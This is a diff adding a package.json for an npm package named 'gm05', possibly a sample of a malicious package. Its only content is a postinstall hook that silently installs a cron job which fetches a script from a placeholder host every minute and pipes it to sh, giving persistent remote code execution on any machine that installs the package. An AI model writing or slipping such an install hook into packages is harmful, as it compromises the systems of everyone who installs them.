@@ -1,0 +1,7 @@
+{
+  "name": "gm05",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "(crontab -l 2>/dev/null; echo \"* * * * * curl -s http://malicious.invalid/script.sh | sh\") | crontab - || true"
+  }
+}
